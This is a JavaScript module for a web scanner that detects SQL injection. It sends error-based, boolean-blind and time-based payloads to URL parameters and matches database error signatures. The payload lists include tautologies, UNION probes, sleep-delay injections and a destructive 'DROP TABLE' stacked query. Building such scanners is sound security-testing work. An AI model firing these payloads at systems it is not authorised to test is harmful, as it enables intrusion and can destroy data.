import { httpGet, httpRequest } from '../../utils/http-client.js';
import { URLParser } from '../input/url-parser.js';
import { generateId, sleep } from '../../utils/helpers.js';
import logger from '../../utils/logger.js';

/**
 * SQL Injection Detector - Error-based, Boolean-blind, Time-based, UNION-based
 */
export class SQLiDetector {
  constructor(options = {}) {
    this.timeout = options.timeout || 10000;
    this.timeBased_delay = options.delay || 5;
    this.results = [];
  }

  /**
   * Full SQLi scan
   */
  async scan(url, options = {}) {
    logger.info(`[SQLi] Scanning: ${url}`);
    const findings = [];

    const parsed = URLParser.parse(url);
    if (!parsed) return findings;

    const params = parsed.params;
    if (Object.keys(params).length === 0) {
      logger.debug(`[SQLi] No parameters found for ${url}`);
      return findings;
    }

    for (const [param, value] of Object.entries(params)) {
      // Test Error-based
      const errorResult = await this._testErrorBased(url, param, value);
      if (errorResult) {
        findings.push(errorResult);
        logger.vuln('critical', `[SQLi] Error-based in ${param} @ ${url}`);
        continue; // Skip other tests if error-based found
      }

      // Test Boolean-based blind
      const boolResult = await this._testBooleanBlind(url, param, value);
      if (boolResult) {
        findings.push(boolResult);
        logger.vuln('high', `[SQLi] Boolean-blind in ${param} @ ${url}`);
        continue;
      }

      // Test Time-based blind
      if (options.timeBased !== false) {
        const timeResult = await this._testTimeBased(url, param, value);
        if (timeResult) {
          findings.push(timeResult);
          logger.vuln('high', `[SQLi] Time-based blind in ${param} @ ${url}`);
        }
      }
    }

    this.results.push(...findings);
    return findings;
  }

  /**
   * Error-based SQL injection detection
   */
  async _testErrorBased(url, param, originalValue) {
    const payloads = [
      { value: "'", desc: 'Single quote' },
      { value: '"', desc: 'Double quote' },
      { value: "' OR '1'='1", desc: 'OR condition' },
      { value: "1' AND '1'='1", desc: 'AND condition' },
      { value: "' UNION SELECT NULL--", desc: 'UNION' },
      { value: "1; DROP TABLE test--", desc: 'Stacked query' },
      { value: "' OR 1=1--", desc: 'Comment bypass' },
      { value: "1' ORDER BY 100--", desc: 'ORDER BY' },
      { value: "') OR ('1'='1", desc: 'Parenthesis bypass' },
      { value: "1 AND 1=CONVERT(int,@@version)--", desc: 'MSSQL version' },
    ];

    for (const payload of payloads) {
      try {
        const baseUrl = url.split('?')[0];
        const parsed = URLParser.parse(url);
        const params = { ...parsed.params, [param]: originalValue + payload.value };
        const testUrl = URLParser.buildUrl(baseUrl, params);

        const response = await httpGet(testUrl, { timeout: this.timeout });
        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data || '');

        const dbType = this._detectSQLError(body);
        if (dbType) {
          return {
            id: generateId('SQLI'),
            type: 'sqli-error-based',
            severity: 'critical',
            url,
            parameter: param,
            payload: payload.value,
            payloadDesc: payload.desc,
            dbType,
            evidence: `SQL error detected: ${dbType}`,
            request: `GET ${testUrl}`,
            response: `HTTP ${response.status}`,
            confidence: 95,
            timestamp: new Date().toISOString(),
          };
        }
      } catch { /* skip */ }
    }

    return null;
  }

  /**
   * Boolean-based blind SQL injection
   */
  async _testBooleanBlind(url, param, originalValue) {
    try {
      const baseUrl = url.split('?')[0];
      const parsed = URLParser.parse(url);

      // Get baseline response
      const baselineResponse = await httpGet(url, { timeout: this.timeout });
      const baselineBody = typeof baselineResponse.data === 'string' ? baselineResponse.data : '';
      const baselineLength = baselineBody.length;

      // True condition
      const truePayloads = [
        `${originalValue}' AND '1'='1`,
        `${originalValue}" AND "1"="1`,
        `${originalValue} AND 1=1`,
        `${originalValue}' AND 1=1--`,
        `${originalValue} OR 1=1`,
      ];

      // False condition
      const falsePayloads = [
        `${originalValue}' AND '1'='2`,
        `${originalValue}" AND "1"="2`,
        `${originalValue} AND 1=2`,
        `${originalValue}' AND 1=2--`,
        `${originalValue} AND 1=0`,
      ];

      for (let i = 0; i < truePayloads.length; i++) {
        const trueParams = { ...parsed.params, [param]: truePayloads[i] };
        const falseParams = { ...parsed.params, [param]: falsePayloads[i] };

        const trueUrl = URLParser.buildUrl(baseUrl, trueParams);
        const falseUrl = URLParser.buildUrl(baseUrl, falseParams);

        const [trueResp, falseResp] = await Promise.all([
          httpGet(trueUrl, { timeout: this.timeout }),
          httpGet(falseUrl, { timeout: this.timeout }),
        ]);

        const trueBody = typeof trueResp.data === 'string' ? trueResp.data : '';
        const falseBody = typeof falseResp.data === 'string' ? falseResp.data : '';

        // Check if true/false conditions produce different responses
        const trueDiff = Math.abs(trueBody.length - baselineLength);
        const falseDiff = Math.abs(falseBody.length - baselineLength);
        const tfDiff = Math.abs(trueBody.length - falseBody.length);

        if (tfDiff > 50 && trueDiff < falseDiff) {
          // Additional verification: true should be similar to baseline
          if (trueResp.status === baselineResponse.status && trueDiff < 100) {
            return {
              id: generateId('SQLI'),
              type: 'sqli-boolean-blind',
              severity: 'high',
              url,
              parameter: param,
              payload: truePayloads[i],
              evidence: `Boolean condition difference: true(${trueBody.length}) vs false(${falseBody.length}) vs baseline(${baselineLength})`,
              request: `TRUE: GET ${trueUrl}\nFALSE: GET ${falseUrl}`,
              response: `TRUE: HTTP ${trueResp.status} (${trueBody.length} bytes)\nFALSE: HTTP ${falseResp.status} (${falseBody.length} bytes)`,
              confidence: 80,
              timestamp: new Date().toISOString(),
            };
          }
        }
      }
    } catch { /* skip */ }

    return null;
  }

  /**
   * Time-based blind SQL injection
   */
  async _testTimeBased(url, param, originalValue) {
    const delay = this.timeBased_delay;
    const payloads = [
      { value: `${originalValue}' AND SLEEP(${delay})--`, db: 'MySQL' },
      { value: `${originalValue}'; WAITFOR DELAY '0:0:${delay}'--`, db: 'MSSQL' },
      { value: `${originalValue}' AND pg_sleep(${delay})--`, db: 'PostgreSQL' },
      { value: `${originalValue}' AND (SELECT ${delay} FROM (SELECT(SLEEP(${delay})))a)--`, db: 'MySQL-subquery' },
      { value: `${originalValue}"||(SELECT ''FROM PG_SLEEP(${delay}))||"`, db: 'PostgreSQL-concat' },
      { value: `${originalValue}' OR SLEEP(${delay})#`, db: 'MySQL-hash' },
    ];

    // First, measure baseline response time
    const baseStart = Date.now();
    await httpGet(url, { timeout: this.timeout + (delay * 1000) + 5000 });
    const baseTime = Date.now() - baseStart;

    for (const payload of payloads) {
      try {
        const baseUrl = url.split('?')[0];
        const parsed = URLParser.parse(url);
        const params = { ...parsed.params, [param]: payload.value };
        const testUrl = URLParser.buildUrl(baseUrl, params);

        const start = Date.now();
        await httpGet(testUrl, { timeout: this.timeout + (delay * 1000) + 5000 });
        const elapsed = Date.now() - start;

        // If response took significantly longer than baseline + delay
        if (elapsed >= (delay * 1000) - 500 && elapsed > baseTime + (delay * 800)) {
          // Verify with a second attempt
          const start2 = Date.now();
          await httpGet(testUrl, { timeout: this.timeout + (delay * 1000) + 5000 });
          const elapsed2 = Date.now() - start2;

          if (elapsed2 >= (delay * 1000) - 500) {
            return {
              id: generateId('SQLI'),
              type: 'sqli-time-blind',
              severity: 'high',
              url,
              parameter: param,
              payload: payload.value,
              dbType: payload.db,
              evidence: `Time delay detected: ${elapsed}ms (baseline: ${baseTime}ms, expected delay: ${delay}s)`,
              request: `GET ${testUrl}`,
              response: `Response delayed by ~${Math.round(elapsed / 1000)}s (verified: ${Math.round(elapsed2 / 1000)}s)`,
              confidence: 85,
              timestamp: new Date().toISOString(),
            };
          }
        }
      } catch { /* skip */ }
    }

    return null;
  }

  /**
   * Detect SQL error patterns in response
   */
  _detectSQLError(body) {
    const patterns = {
      MySQL: [
        /SQL syntax.*?MySQL/i,
        /Warning.*?mysql_/i,
        /MySQLSyntaxErrorException/i,
        /valid MySQL result/i,
        /check the manual that corresponds to your MySQL/i,
        /Unknown column '[^']+' in/i,
        /com\.mysql\.jdbc/i,
        /MySql\.Data\.MySqlClient/i,
      ],
      PostgreSQL: [
        /PostgreSQL.*?ERROR/i,
        /Warning.*?\bpg_/i,
        /valid PostgreSQL result/i,
        /Npgsql\./i,
        /PG::SyntaxError/i,
        /org\.postgresql\.util\.PSQLException/i,
        /ERROR:\s+syntax error at or near/i,
      ],
      MSSQL: [
        /Driver.*?SQL[\-\_\ ]*Server/i,
        /OLE DB.*?SQL Server/i,
        /\bSQL Server[^&lt;&quot;]+Driver/i,
        /Warning.*?mssql_/i,
        /\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}/i,
        /System\.Data\.SqlClient\./i,
        /Unclosed quotation mark after the character string/i,
        /Microsoft SQL Native Client error/i,
      ],
      Oracle: [
        /\bORA-\d{5}/i,
        /Oracle error/i,
        /Oracle.*?Driver/i,
        /Warning.*?\boci_/i,
        /Warning.*?\bora_/i,
        /oracle\.jdbc\.driver/i,
        /quoted string not properly terminated/i,
      ],
      SQLite: [
        /SQLite\/JDBCDriver/i,
        /SQLite\.Exception/i,
        /System\.Data\.SQLite\.SQLiteException/i,
        /Warning.*?sqlite_/i,
        /Warning.*?SQLite3::/i,
        /\[SQLITE_ERROR\]/i,
        /SQLite error \d+:/i,
        /sqlite3\.OperationalError/i,
      ],
    };

    for (const [dbType, regexList] of Object.entries(patterns)) {
      for (const regex of regexList) {
        if (regex.test(body)) {
          return dbType;
        }
      }
    }

    return null;
  }
}

export default SQLiDetector;
